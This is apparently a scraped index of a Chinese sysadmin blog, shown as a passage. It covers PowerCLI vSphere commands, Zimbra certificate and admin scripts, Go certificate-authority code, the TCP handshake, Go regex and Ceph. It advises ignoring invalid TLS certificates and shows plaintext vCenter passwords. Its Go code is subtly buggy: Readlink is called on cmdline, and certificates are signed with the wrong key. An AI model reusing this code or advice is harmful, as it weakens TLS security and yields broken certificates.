-Server 这里是“SSL连接不能建立\u0026hellip;\u0026hellip;”这实际上意味着你没有一个有效的证书。如果你想连接到vCenter没有一个有效的证书，您必须允许可以改变你的vCenter证书到受信任的一个，这是正确的解决方案，也可以忽略无效的证书，以规避所有的安全性，但使它现在的工作。\n忽略无效证书\nSet-PowerCLIConfiguration -InvalidCertificateAction:ignore 再次登陆可正常登陆 ","permalink":"https://www.oomkill.com/2019/10/powercli-the-ssl-connection-could-not-be-established-see-inner-exception/","summary":"","title":"powercli The SSL connection could not be established, see inner exception. 问题解决"},{"content":"Connect-VIServer -Server 10.11.17.20 -User administrator@vsphere.local -Password DC02@123456\rGet-OSCustomizationSpec linux1|Get-OSCustomizationNicMapping|Set-OSCustomizationNicMapping -IpMode UseStaticIP -SubnetMask 255.255.255.0 -DefaultGateway 10.10.12.254 -IpAddress 10.10.12.114\rnew-VM -Name zy-ntw-prod-dbvm-pushredis01 -Template template-centos76 -VMHost 10.10.12.14 -OSCustomizationspec linux1\rGet-VM -name zy-ntw-prod-dbvm-pushredis01|set-VM -MemoryGB 96 -NumCPU 16\rget-vm zy-ntw-prod-dbvm-pushredis01|New-HardDisk -CapacityGB 100\rNew-Snapshot -Name \u0026quot;20200622\u0026quot;\rConnect-VIServer -Server 10.11.17.20 -User administrator@vsphere.local -Password DC@123456\rConnect-VIServer -Server 10.11.17.20 -User administrator@vsphere.local -Password DC02@123456\rConnect-VIServer -Server 10.10.200.20 -User administrator@vsphere.local -Password DC@123456\rGet-OSCustomizationSpec linux1|Get-OSCustomizationNicMapping|Set-OSCustomizationNicMapping -IpMode UseStaticIP -SubnetMask 255.255.255.0 -DefaultGateway 10.11.31.254 -IpAddress 10.11.31.65\rnew-VM -Name zy-ntw-zr-prod-vip-upgrade01 -Template template-centos76 -VMHost 10.11.31.4 -OSCustomizationspec linux1\rGet-OSCustomizationSpec linux1|Get-OSCustomizationNicMapping|Set-OSCustomizationNicMapping -IpMode UseStaticIP -SubnetMask 255.255.255.0 -DefaultGateway 10.11.31.254 -IpAddress 10.11.31.66\rnew-VM -Name zy-ntw-zr-prod-vip-upgrade02 -Template template-centos76 -VMHost 10.11.31.5 -OSCustomizationspec linux1\rget-vm zy-ntw-zr-prod-vip-upgrade*|set-VM -MemoryGB 8 -NumCPU 4\rget-harddisk zy-ntw-zr-prod-vip-upgrade* get-harddisk zy-ntw-zr-prod-vip-upgrade*|set-harddisk -CapacityGB 100 # 现有硬盘扩容\rget-vm zy-ntw-zr-prod-vip-upgrade* |get-harddisk|set-harddisk -CapacityGB 100\r## 删除虚拟机\rremove-vm –deletepermanently ","permalink":"https://www.oomkill.com/2019/10/powercli-vsphere-command/","summary":"","title":"powercli常用命令"},{"content":" 文档中心 https://pubs.vmware.com/vsphere-51/index.jsp?topic=%2Fcom.vmware.powercli.cmdletref.doc%2FSet-OSCustomizationSpec.html https://blogs.vmware.com/PowerCLI/2014/05/working-customization-specifications-powercli-part-1.html http://powershelldistrict.com/powercli-oscustomizationspec/ https://powercli-core.readthedocs.io/en/latest/cmd_new.html#new-oscustomizationspec 官方文档中心\n添加一块新硬盘\nget-vm {vmname}|New-HardDisk -CapacityGB 300 批量设置硬件\nGet-VM -name {hostname}*|set-VM -MemoryGB 4 -NumCPU 2 基于模板创建虚拟机\nnew-VM -Name {hostname} -Template template-centos76 -VMHost 10.112.131.5 -OSCustomizationspec TestLinux 设置规范模板\nGet-OSCustomizationSpec TestLinux|Get-OSCustomizationNicMapping|Set-OSCustomizationNicMapping \\ -IpMode UseStaticIP \\ -SubnetMask 255.255.255.0 \\ -DefaultGateway 10.11.121.254 \\ -IpAddress 10.11.121.203 Get-OSCustomizationSpec TestLinux|Get-OSCustomizationNicMapping|Set-OSCustomizationNicMapping \\ -IpMode UseStaticIP \\ -SubnetMask 255.255.255.0 \\ -DefaultGateway 10.11.131.254 \\ -IpAddress 10.11.131.64 获得规范信息\nGet-OSCustomizationSpec liunx 创建一个新的规范\nNew-OSCustomizationSpec -OSType \u0026quot;Linux\u0026quot; -Name linux1 -Type Persistent –DnsServer \u0026quot;8.8.8.8\u0026quot; –Domain \u0026quot;vmware.com\u0026quot; 批量创建脚本\n$vserver=\u0026quot;10.111.111.22\u0026quot; $vuser=\u0026quot;youname\u0026quot; $vpwd=\u0026quot;yourpasswd\u0026quot; filter Convert-IP2Decimal { ([IPAddress][String]([IPAddress]$_)).Address } filter Convert-Decimal2IP { ([System.Net.IPAddress]$_).IPAddressToString } $IPPrefix=\u0026quot;10.111.31\u0026quot; $startIp=$args[0] $startHostname=$args[1] $num=$args[2] $gateway=\u0026quot;10.111.31.254\u0026quot; $netmask=\u0026quot;255.255.255.0\u0026quot; $cpu=4 $mem=8 $template=\u0026quot;template-centos7\u0026quot; $vhost17=,\u0026quot;10.111.17.1\u0026quot;,\u0026quot;10.111.17.2\u0026quot;,\u0026quot;10.111.17.3\u0026quot;,\u0026quot;10.111.17.4\u0026quot; $vhost20=,\u0026quot;10.111.20.1\u0026quot;,\u0026quot;10.111.20.2\u0026quot;,\u0026quot;10.111.20.3\u0026quot;,\u0026quot;10.111.20.4\u0026quot; $vhost31=,\u0026quot;10.111.31.1\u0026quot;,\u0026quot;10.111.31.2\u0026quot;,\u0026quot;10.111.31.3\u0026quot;,\u0026quot;10.111.31.4\u0026quot; function LoginVSphere($server,$user,$pwd){ Connect-VIServer -Server $server[0] -User $server[1] -Password $server[2] -EA \u0026quot;Stop\u0026quot; } LoginVSphere($vserver, $vuser, $vpwd) $temp=Get-OSCustomizationSpec TestLinux for($n=[int]$startIp;$n -le [int]$num; $n++) { $ipaddr=-Join($IPPrefix,'.',$n) $hostname=-Join($startHostname,$n) $temp|Get-OSCustomizationNicMapping|Set-OSCustomizationNicMapping -IpMode UseStaticIP -SubnetMask $netmask -DefaultGateway $gateway -IpAddress $ipaddr new-VM -Name $hostname -Template $template -VMHost 10.111.31.5 -OSCustomizationspec TestLinux -Confirm:$false Get-VM -Name $hostname|Set-VM -MemoryGB $mem -NumCPU $cpu -Confirm:$false } Reference https://communities.vmware.com/thread/567585\n脚本参考\nhttps://blogs.vmware.com/PowerCLI/2014/05/working-customization-specifications-powercli-part-1.html\nhttp://powershelldistrict.com/powercli-oscustomizationspec/\nhttps://pubs.vmware.com/vsphere-51/index.jsp?topic=%2Fcom.vmware.powercli.cmdletref.doc%2FSet-OSCustomizationSpec.html\n","permalink":"https://www.oomkill.com/2019/10/powercli-vsphere-command/","summary":"","title":"powercli创建虚拟机步骤及批量创建脚本"},{"content":"zimbra在后台安装证书签发机构签发证书出现时候出现错误：{RemoteManager: mail.domain.com-\u0026gt;zimbra@mail.domain.com:22}\ncom.zimbra.common.service.ServiceException: system failure: exception during auth {RemoteManager: mail.domain.com-\u0026gt;zimbra@mail.domain.com:22} ExceptionId:qtp1068934215-357:https:https ://mail.domain.com:7071/service/admin/soap/GetMailQueueRequest: Code:service.FAILURE com.zimbra.common.service.ServiceException: system failure: exception during auth {RemoteManager: mail.domain.com-\u0026gt;zimbra@mail.domain.com:22} ExceptionId:qtp1068934215-357:https:https ://mail.domain.com:7071/service/admin/soap/GetMailQueueRequest: Code:service.FAILURE at com.zimbra.common.service.ServiceException.FAILURE(ServiceException.java:286) at com.zimbra.cs.rmgmt.RemoteManager.getSession(RemoteManager.java:209) at com.zimbra.cs.rmgmt.RemoteManager.execute(RemoteManager.java:139) at com.zimbra.cert.GetCert.addCertsOnServer(GetCert.java:112) at com.zimbra.cert.GetCert.handle(GetCert.java:75) Caused by: java.io.IOException: There was a problem while connecting to mail.domain.com:22 at ch.ethz.ssh2.Connection.connect(Connection.java:699) at ch.ethz.ssh2.Connection.connect(Connection.java:490) at com.zimbra.cs.rmgmt.RemoteManager.getSession(RemoteManager.java:200) ... 59 more 检查ssh的配置与zimbra的配置\n$ zmprov gacf | grep Remote zimbraRemoteImapBindPort: 8143 zimbraRemoteImapSSLBindPort: 8993 zimbraRemoteImapSSLServerEnabled: TRUE zimbraRemoteImapServerEnabled: TRUE zimbraRemoteManagementCommand: /opt/zimbra/libexec/zmrcd zimbraRemoteManagementPort: 22 zimbraRemoteManagementPrivateKeyPath: /opt/zimbra/.ssh/zimbra_identity zimbraRemoteManagementUser: zimbra 看到ssh端口为22，修改为当前系统使用的ssh端口\nzmprov mcf zimbraRemoteManagementPort {sshport} 再次查看\nzmprov gacf | grep Remote zimbraRemoteImapBindPort: 8143 zimbraRemoteImapSSLBindPort: 8993 zimbraRemoteImapSSLServerEnabled: TRUE zimbraRemoteImapServerEnabled: TRUE zimbraRemoteManagementCommand: /opt/zimbra/libexec/zmrcd zimbraRemoteManagementPort: 9955 zimbraRemoteManagementPrivateKeyPath: /opt/zimbra/.ssh/zimbra_identity zimbraRemoteManagementUser: zimbra 修改zimbra用户可以被允许登陆ssh\nAllowUsers root zimbra 此时可以正确提交\nReference http://thaiserv.blogspot.com/2015/05/get-message-failure-exception-during.html https://wiki.zimbra.com/wiki/RemoteManager_exception\n","permalink":"https://www.oomkill.com/2019/10/zimbra-ssl/","summary":"","title":"zimbra安装ssl证书"},{"content":"文章概述了如何使用 zmsetservername 更改 Zimbra 服务器的主机名。请注意，此 CLI 命令的用法因您运行的 ZCS 版本而异。\n语法：\n./zmsetservername [-h] [-d] [-f] [-s] [-o \u0026lt;上一个服务器名称\u0026gt;] [-v+] -n \u0026lt;服务器名称\u0026gt; 参数说明\nName Description \u0026ndash;help 显示 zmsetservername 的使用选项。 \u0026ndash;force 强制重命名，绕过安全检查。 \u0026ndash;oldServerName 服务器以前的名称。默认为 LC zimbra_server_hostname。 \u0026ndash;newServerName 服务器的新名称。 \u0026ndash;deletelogger 删除旧服务器的记录器数据库。默认是将其数据重新映射到新主机名。 \u0026ndash;skipusers 跳过使用新服务器修改用户数据库。 \u0026ndash;usersonly 仅更新用户数据库。这样，您可以运行一次来完成所有服务器更新，然后运行第二次来更新帐户。可能需要 --force。 \u0026ndash;verbose 设置详细级别。可以多次指定以提高级别。 Reference zm设置服务器名称\n","permalink":"https://www.oomkill.com/2019/10/zimbra-change-servername/","summary":"","title":"zimbra修改ServerName"},{"content":"#!/bin/bash\r# $1 domain\r# $2 email\rzmprov ma $2 zimbraIsDelegatedAdminAccount TRUE\rzmprov ma $2 zimbraAdminConsoleUIComponents cartBlancheUI zimbraAdminConsoleUIComponents domainListView zimbraAdminConsoleUIComponents accountListView zimbraAdminConsoleUIComponents DLListView\rzmprov ma $2 zimbraDomainAdminMaxMailQuota 0\rzmprov grantRight domain $1 usr $2 +createAccount\rzmprov grantRight domain $1 usr $2 +createAlias\rzmprov grantRight domain $1 usr $2 +createCalendarResource\rzmprov grantRight domain $1 usr $2 +createDistributionList\rzmprov grantRight domain $1 usr $2 +deleteAlias\rzmprov grantRight domain $1 usr $2 +listDomain\rzmprov grantRight domain $1 usr $2 +domainAdminRights\rzmprov grantRight domain $1 usr $2 set.account.zimbraAccountStatus\rzmprov grantRight domain $1 usr $2 set.account.sn\rzmprov grantRight domain $1 usr $2 set.account.displayName\rzmprov grantRight domain $1 usr $2 set.account.zimbraPasswordMustChange\rzmprov grantRight account $2 usr $2 +deleteAccount\rzmprov grantRight account $2 usr $2 +getAccountInfo\rzmprov grantRight account $2 usr $2 +getAccountMembership\rzmprov grantRight account $2 usr $2 +listAccount\rzmprov grantRight account $2 usr $2 +removeAccountAlias\rzmprov grantRight account $2 usr $2 +renameAccount\rzmprov grantRight account $2 usr $2 +setAccountPassword\rzmprov grantRight account $2 usr $2 +viewAccountAdminUI\rzmprov grantRight account $2 usr $2 +configureQuota\r","permalink":"https://www.oomkill.com/2019/10/zimbra-admin-script/","summary":"","title":"zimbra用户管理员脚本"},{"content":" 一个很好的问题：How golang to get process name by process id (pid)?\n目前看来go api并没有提供通过pid获取进程名称的方法，可以通过 /proc/\u0026lt;pid\u0026gt;/cmdline来获取对应的进程名称，也可以通过 readlink /proc/6530/exe 来获取\n/proc/\u0026lt;pid\u0026gt;/cmdline 获取的为运行进程的名称，通常包含一些特殊字符。例如 \u0026quot;-bash\\x00\u0026quot;，sshd: root@pts/0 readlink /proc/6530/exe 获取的为对应进程运行的程序的路径 pid := os.Getppid() contents, err := ioutil.ReadFile(fmt.Sprintf(\u0026quot;/proc/%d/cmdline\u0026quot;,pid)) pid := os.Getppid() contents, err := os.Readlink(fmt.Sprintf(\u0026quot;/proc/%d/cmdline\u0026quot;,pid)) Reference process name from pid\n","permalink":"https://www.oomkill.com/2019/10/goskill-process-id/","summary":"","title":"如何使用golang通过进程ID找到进程名称"},{"content":"本篇文章中，将描述如何使用go创建CA，并使用CA签署证书。在使用openssl创建证书时，遵循的步骤是 创建秘钥 \u0026gt; 创建CA \u0026gt; 生成要颁发证书的秘钥 \u0026gt; 使用CA签发证书。这种步骤，那么我们现在就来尝试下。\n创建证书的颁发机构 首先，会从将从创建 CA 开始。CA 会被用来签署其他证书\n// 对证书进行签名 ca := \u0026amp;x509.Certificate{ SerialNumber: big.NewInt(2019), Subject: pkix.Name{ CommonName: \u0026quot;domain name\u0026quot;, Organization: []string{\u0026quot;Company, INC.\u0026quot;}, Country: []string{\u0026quot;US\u0026quot;}, Province: []string{\u0026quot;\u0026quot;}, Locality: []string{\u0026quot;San Francisco\u0026quot;}, StreetAddress: []string{\u0026quot;Golden Gate Bridge\u0026quot;}, PostalCode: []string{\u0026quot;94016\u0026quot;}, }, NotBefore: time.Now(), // 生效时间 NotAfter: time.Now().AddDate(10, 0, 0), // 过期时间 年月日 IsCA: true, // 表示用于CA // openssl 中的 extendedKeyUsage = clientAuth, serverAuth 字段 ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth}, // openssl 中的 keyUsage 字段 KeyUsage: x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign, BasicConstraintsValid: true, } 接下来需要对证书生成公钥和私钥\ncaPrivKey, err := rsa.GenerateKey(rand.Reader, 4096) if err != nil { return err } 然后生成证书：\ncaBytes, err := x509.CreateCertificate(rand.Reader, ca, ca, \u0026amp;caPrivKey.PublicKey, caPrivKey) if err != nil { return err } 我们看到的证书内容是PEM编码后的，现在caBytes我们有了生成的证书，我们将其进行 PEM 编码以供以后使用：\ncaPEM := new(bytes.Buffer) pem.Encode(caPEM, \u0026amp;pem.Block{ Type: \u0026quot;CERTIFICATE\u0026quot;, Bytes: caBytes, }) caPrivKeyPEM := new(bytes.Buffer) pem.Encode(caPrivKeyPEM, \u0026amp;pem.Block{ Type: \u0026quot;RSA PRIVATE KEY\u0026quot;, Bytes: x509.MarshalPKCS1PrivateKey(caPrivKey), }) 创建证书 证书的 x509.Certificate 与CA的 x509.Certificate 属性有稍微不同，需要进行一些修改\ncert := \u0026amp;x509.Certificate{ SerialNumber: big.NewInt(1658), Subject: pkix.Name{ CommonName: \u0026quot;domain name\u0026quot;, Organization: []string{\u0026quot;Company, INC.\u0026quot;}, Country: []string{\u0026quot;US\u0026quot;}, Province: []string{\u0026quot;\u0026quot;}, Locality: []string{\u0026quot;San Francisco\u0026quot;}, StreetAddress: []string{\u0026quot;Golden Gate Bridge\u0026quot;}, PostalCode: []string{\u0026quot;94016\u0026quot;}, }, IPAddresses: []net.IP{}, // 这里就是openssl配置文件中 subjectAltName 里的 IP:/IP= DNSNames: []string{}, // 这里就是openssl配置文件中 subjectAltName 里的 DNS:/DNS= NotBefore: time.Now(), NotAfter: time.Now().AddDate(10, 0, 0), SubjectKeyId: []byte{1, 2, 3, 4, 6}, // 这里就是openssl中的extendedKeyUsage ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth}, KeyUsage: x509.KeyUsageDigitalSignature, } 注：这里会在证书中特别添加了 DNS 和 IP （这个不是必须的），这个选项的增加代表的我们的证书可以支持多域名\n为该证书创建私钥和公钥：\ncertPrivKey, err := rsa.GenerateKey(rand.Reader, 4096) if err != nil { return err } 使用CA签署证书 有了上述的内容后，可以创建证书并用CA进行签名\ncertBytes, err := x509.CreateCertificate(rand.Reader, cert, ca, \u0026amp;certPrivKey.PublicKey, caPrivKey) if err != nil { return err } 要保存成证书格式需要做PEM编码\ncertPEM := new(bytes.Buffer) pem.Encode(certPEM, \u0026amp;pem.Block{ Type: \u0026quot;CERTIFICATE\u0026quot;, Bytes: certBytes, }) certPrivKeyPEM := new(bytes.Buffer) pem.Encode(certPrivKeyPEM, \u0026amp;pem.Block{ Type: \u0026quot;RSA PRIVATE KEY\u0026quot;, Bytes: x509.MarshalPKCS1PrivateKey(certPrivKey), }) 把上面内容融合为一起 创建一个 ca.go 里面是创建ca和颁发证书的逻辑\npackage main import ( \u0026quot;bytes\u0026quot; cr \u0026quot;crypto/rand\u0026quot; \u0026quot;crypto/rsa\u0026quot; \u0026quot;crypto/x509\u0026quot; \u0026quot;crypto/x509/pkix\u0026quot; \u0026quot;encoding/pem\u0026quot; \u0026quot;math/big\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;net\u0026quot; \u0026quot;os\u0026quot; \u0026quot;time\u0026quot; ) type CERT struct { CERT []byte CERTKEY *rsa.PrivateKey CERTPEM *bytes.Buffer CERTKEYPEM *bytes.Buffer CSR *x509.Certificate } func CreateCA(sub *pkix.Name, expire int) (*CERT, error) { var ( ca = new(CERT) err error ) if expire \u0026lt; 1 { expire = 1 } // 为ca生成私钥 ca.CERTKEY, err = rsa.GenerateKey(cr.Reader, 4096) if err != nil { return nil, err } // 对证书进行签名 ca.CSR = \u0026amp;x509.Certificate{ SerialNumber: big.NewInt(rand.Int63n(2000)), Subject: *sub, NotBefore: time.Now(), // 生效时间 NotAfter: time.Now().AddDate(expire, 0, 0), // 过期时间 IsCA: true, // 表示用于CA // openssl 中的 extendedKeyUsage = clientAuth, serverAuth 字段 ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth}, // openssl 中的 keyUsage 字段 KeyUsage: x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign, BasicConstraintsValid: true, } // 创建证书 // caBytes 就是生成的证书 ca.CERT, err = x509.CreateCertificate(cr.Reader, ca.CSR, ca.CSR, \u0026amp;ca.CERTKEY.PublicKey, ca.CERTKEY) if err != nil { return nil, err } ca.CERTPEM = new(bytes.Buffer) pem.Encode(ca.CERTPEM, \u0026amp;pem.Block{ Type: \u0026quot;CERTIFICATE\u0026quot;, Bytes: ca.CERT, }) ca.CERTKEYPEM = new(bytes.Buffer) pem.Encode(ca.CERTKEYPEM, \u0026amp;pem.Block{ Type: \u0026quot;RSA PRIVATE KEY\u0026quot;, Bytes: x509.MarshalPKCS1PrivateKey(ca.CERTKEY), }) // 进行PEM编码，编码就是直接cat证书里面内容显示的东西 return ca, nil } func Req(ca *x509.Certificate, sub *pkix.Name, expire int, dns []string, ip []net.IP) (*CERT, error) { var ( cert = \u0026amp;CERT{} err error ) cert.CERTKEY, err = rsa.GenerateKey(cr.Reader, 4096) if err != nil { return nil, err } if expire \u0026lt; 1 { expire = 1 } cert.CSR = \u0026amp;x509.Certificate{ SerialNumber: big.NewInt(rand.Int63n(2000)), Subject: *sub, IPAddresses: ip, DNSNames: dns, NotBefore: time.Now(), NotAfter: time.Now().AddDate(expire, 0, 0), SubjectKeyId: []byte{1, 2, 3, 4, 6}, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth}, KeyUsage: x509.KeyUsageDigitalSignature, } cert.CERT, err = x509.CreateCertificate(cr.Reader, cert.CSR, ca, \u0026amp;cert.CERTKEY.PublicKey, cert.CERTKEY) if err != nil { return nil, err } cert.CERTPEM = new(bytes.Buffer) pem.Encode(cert.CERTPEM, \u0026amp;pem.Block{ Type: \u0026quot;CERTIFICATE\u0026quot;, Bytes: cert.CERT, }) cert.CERTKEYPEM = new(bytes.Buffer) pem.Encode(cert.CERTKEYPEM, \u0026amp;pem.Block{ Type: \u0026quot;RSA PRIVATE KEY\u0026quot;, Bytes: x509.MarshalPKCS1PrivateKey(cert.CERTKEY), }) return cert, nil } func Write(cert *CERT, file string) error { keyFileName := file + \u0026quot;.key\u0026quot; certFIleName := file + \u0026quot;.crt\u0026quot; kf, err := os.Create(keyFileName) if err != nil { return err } defer kf.Close() if _, err := kf.Write(cert.CERTKEYPEM.Bytes()); err != nil { return err } cf, err := os.Create(certFIleName) if err != nil { return err } if _, err := cf.Write(cert.CERTPEM.Bytes()); err != nil { return err } return nil } 如果需要使用的话，可以引用这些函数\npackage main import ( \u0026quot;crypto/x509/pkix\u0026quot; \u0026quot;log\u0026quot; \u0026quot;net\u0026quot; ) func main() { subj := \u0026amp;pkix.Name{ CommonName: \u0026quot;chinamobile.com\u0026quot;, Organization: []string{\u0026quot;Company, INC.\u0026quot;}, Country: []string{\u0026quot;US\u0026quot;}, Province: []string{\u0026quot;\u0026quot;}, Locality: []string{\u0026quot;San Francisco\u0026quot;}, StreetAddress: []string{\u0026quot;Golden Gate Bridge\u0026quot;}, PostalCode: []string{\u0026quot;94016\u0026quot;}, } ca, err := CreateCA(subj, 10) if err != nil { log.Panic(err) } Write(ca, \u0026quot;./ca\u0026quot;) crt, err := Req(ca.CSR, subj, 10, []string{\u0026quot;test.default.svc\u0026quot;, \u0026quot;test\u0026quot;}, []net.IP{}) if err != nil { log.Panic(err) } Write(crt, \u0026quot;./tls\u0026quot;) } 遇到的问题 panic: x509: unsupported public key type: rsa.PublicKey\n这里是因为 x509.CreateCertificate 的参数 privatekey 需要传入引用变量，而传入的是一个普通变量\n注：x509: only RSA and ECDSA public keys supported\n一些参数的意思 extendedKeyUsage ：增强型密钥用法(参见\u0026quot;new_oids\u0026quot;字段)：服务器身份验证、客户端身份验证、时间戳。\nextendedKeyUsage = critical,serverAuth, clientAuth, timeStamping keyUsage ： 密钥用法，防否认(nonRepudiation)、数字签名(digitalSignature)、密钥加密(keyEncipherment)。\nkeyUsage = nonRepudiation, digitalSignature, keyEncipherment Reference\ngolang ca and signed cert go\npackage x509\n","permalink":"https://www.oomkill.com/2019/10/goskill-x509-in-go/","summary":"","title":"使用go语言颁发CA证书"},{"content":"TCP的三次握手 所谓三次握手 Three-Way Handshake 是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。好比两个人在打电话：\n当连接被建立或被终止，交换的报文段只包含TCP头部，而没有数据。\ntcp报文头部结构 序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。 确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，确认方ack=发起方seq+1，两端配对。 标志位 ACK：确认序号有效。 FIN：释放一个连接。 RST：重置连接。 SYN：发起一个新连接。 PSH：接收方应该尽快将这个报文交给应用层。 URG：紧急指针（urgent pointer）有效。 第一次握手：客户端要向服务端发起连接请求，首先客户端随机生成一个起始序列号ISN(比如是100)，那客户端向服务端发送的报文段包含SYN标志位(也就是SYN=1)，序列号seq=100。\n第二次握手：服务端收到客户端发过来的报文后，发现SYN=1，知道这是一个连接请求，于是将客户端的起始序列号100存起来，并且随机生成一个服务端的起始序列号(比如是300)。然后给客户端回复一段报文，回复报文包含SYN和ACK标志(也就是SYN=1,ACK=1)、序列号seq=300、确认号ack=101(客户端发过来的序列号+1)。\n第三次握手：客户端收到服务端的回复后发现ACK=1并且ack=101,于是知道服务端已经收到了序列号为100的那段报文；同时发现SYN=1，知道了服务端同意了这次连接，于是就将服务端的序列号300给存下来。然后客户端再回复一段报文给服务端，报文包含ACK标志位(ACK=1)、ack=301(服务端序列号+1)、seq=101(第一次握手时发送报文是占据一个序列号的，所以这次seq就从101开始，需要注意的是不携带数据的ACK报文是不占据序列号的，所以后面第一次正式发送数据时seq还是101)。当服务端收到报文后发现ACK=1并且ack=301，就知道客户端收到序列号为300的报文了，就这样客户端和服务端通过TCP建立了连接。\n四次挥手 比如客户端初始化的序列号ISA=100，服务端初始化的序列号ISA=300。TCP连接成功后客户端总共发送了1000个字节的数据，服务端在客户端发FIN报文前总共回复了2000个字节的数据。\n第一次挥手：当客户端的数据都传输完成后，客户端向服务端发出连接释放报文(当然数据没发完时也可以发送连接释放报文并停止发送数据)，释放连接报文包含FIN标志位(FIN=1)、序列号seq=1101(100+1+1000，其中的1是建立连接时占的一个序列号)。需要注意的是客户端发出FIN报文段后只是不能发数据了，但是还可以正常收数据；另外FIN报文段即使不携带数据也要占据一个序列号。\n第二次挥手：服务端收到客户端发的FIN报文后给客户端回复确认报文，确认报文包含ACK标志位(ACK=1)、确认号ack=1102(客户端FIN报文序列号1101+1)、序列号seq=2300(300+2000)。此时服务端处于关闭等待状态，而不是立马给客户端发FIN报文，这个状态还要持续一段时间，因为服务端可能还有数据没发完。\n第三次挥手：服务端将最后数据(比如50个字节)发送完毕后就向客户端发出连接释放报文，报文包含FIN和ACK标志位(FIN=1,ACK=1)、确认号和第二次挥手一样ack=1102、序列号seq=2350(2300+50)。\n第四次挥手：客户端收到服务端发的FIN报文后，向服务端发出确认报文，确认报文包含ACK标志位(ACK=1)、确认号ack=2351、序列号seq=1102。注意客户端发出确认报文后不是立马释放TCP连接，而是要经过2MSL(最长报文段寿命的2倍时长)后才释放TCP连接。而服务端一旦收到客户端发出的确认报文就会立马释放TCP连接，所以服务端结束TCP连接的时间要比客户端早一些。\n","permalink":"https://www.oomkill.com/2019/10/go-tcp-hadshake/","summary":"","title":"通过Go语言中阐述TCP Handshake"},{"content":"正则表达式是一种进行模式匹配和文本操纵的复杂而又强大的工具。虽然正则表达式比纯粹的文本匹配效率低，但是它却更灵活。按照它的语法规则，随需构造出的匹配模式就能够从原始文本中筛选出几乎任何你想要得到的字符组合。\nGo语言通过regexp（regular expression）标准包为正则表达式提供了官方支持，包名采用regular expression的每个单词的前三个首字母组成。\nGo语言的正则表达式实现的是RE2标准，Go语言的正则表达式与其他编程语言之间也有一些小的差异。\n正则表达式规则 go语言中regexp包使用 简单来说，Go语言中使用正则表达式只需要两步即可：\n解析、编译正则表达式 regexp.MustCompile() 返回一个regexp结构体 根据解析好的规则（结构体形式），从指定字符串中提取需要的信息。如 MatchString() FindAllSubmatch()等 package main import ( \u0026quot;fmt\u0026quot; \u0026quot;regexp\u0026quot; ) func main() { rege := regexp.MustCompile(`(\\d{1,3}\\.){3}\\d{1,3}`) str := rege.FindAllString(\u0026quot;SLAJDLKAJ192.168.0.1DASDASA1231\u0026quot;, -1) fmt.Println(str) } ","permalink":"https://www.oomkill.com/2019/10/go-regular-expression/","summary":"","title":"正则表达式在go中使用"},{"content":"什么是块存储 RBD Ceph RBD (RADOS Block Device) 是 Ceph 提供的三种存储类型之一 (块存储 RBD, 文件存储 CephFS, 对象存储 RGW)，也是另外两个存储类型 (文件存储 CephFS, 对象存储 RGW) 的底座，位于 RADOS 架构中的最底层，由下图可以看出\n图：Ceph RADOS架构图\rSource：https://www.supportsages.com/ceph-part-3-technical-architecture-and-components/\nRADOS 是可信赖的自动分布式对象存储 (Reliable Autonomous Distributed Object Store) 的简写，通俗来说，RADOS 代表的就是整个 Ceph 集群，数据对象在集群中的存储方式会“将对象复制为多副本” 以实现容错，所以 Ceph 集群的底座就是 RADOS，一个 RADOS 集群的组件通常包含三个，OSD Daemon , MDS, MON\nObject Storage Device (OSD) Daemon：RADOS集群中负责存储守护进程，与 OSD (数据的物理或逻辑存储单元【通常指一个硬盘】)交互。集群中的每个 Ceph Node 都必须运行 OSD Daemon。对于每个 OSD，可以有一个关联的硬盘 (通常一个OSD Daemon 对应一个存储单元)。 MONITORS (Mon Daemon)：Monitor (ceph-mon) 不是集群存储组件的一部分，但它通过监视 OSD 状态并生成 “Cluster Map” 而成为 RADOS 不可或缺的一部分。它监视 OSD 并跟踪在给定时间点哪些 OSD 处于运行状态、哪些 OSD 处于对等状态、OSD 的状态等。一般来说，它充当存储集群中所有 OSD 的 Monitor Manager (MGR Daemon)：Manager (ceph-mgr) 是与 ceph-mon 一同运行的守护进程，为外部监控和管理系统提供额外的监视和接口。默认情况下，ceph-mgr 除了确保其正在运行之外不需要其他配置。如果没有运行 ceph-mgr，ceph -s 将会看到一条 WARN；不管是使用什么方式部署的集群 ( ceph-deploy, cephadm)，ceph-mgr 总会 与 ceph-mon 同时运行在一个节点上，也可单独运行在 Ceph Node 之上。 通常 Monitor (ceph-mon) 不构成“存储”集群的一部分，只是通过监视 OSD 状态并生成 Cluster map 而成为 ceph存储集群中不可缺少的组件。它通过监视 OSD 并跟踪在给定时间点哪些 OSD 处于运行状态、哪些 OSD 处于对等状态、OSD 的状态等。\n如何确定 ceph-mon 的数量 ceph-mon 的数量最好是奇数，并且数量个数时有限限制的，这里在总结一下 ceph monitor 的作用：\nMonitor 不向客户端提供存储的对象，由于它只是一个监控节点，因此它不保存/管理任何对象，也不属于对象存储的一部分，但它仍然是 RADOS 的一部分，但不用于数据/对象存储。 它维护簇映射状态，即：存储集群客户端/应用程序从 ceph-mon 检索集群映射的副本 通常很奇怪并且数量有限，因为他们的工作相当简单，维护 OSD 的状态。 为分布式决策提供共识，当要针对 OSD 的状态做出特定决策时，它提供了一般规则。 当多个 OSD 要进行对等互连或复制时，监视器会自行决定如何进行对等互连，而不是由 ODS 自行决定。 Ceph OSD 守护进程检查自身状态和其他 OSD 的状态并向监视器报告。 中国铁路2020年分享的 1550+ OSD PB 级别存储 ceph-con 数量从 “3” 升级到 “5” 后，趋势稳定 [1]\nRBD 存储单元 RBD 块设备 (RADOS Block Device) 在 Ceph 中被称为 image。image 由 “元数据” 和 ”数据“两部分组成，其中元数据存储在多个特殊的 RADOS 对象中，而数据被自动”条带化“成多个 RADOS 对象进行存储。除了 image 自身的元数据之外，在 image 所属的 存储池 (Pool) 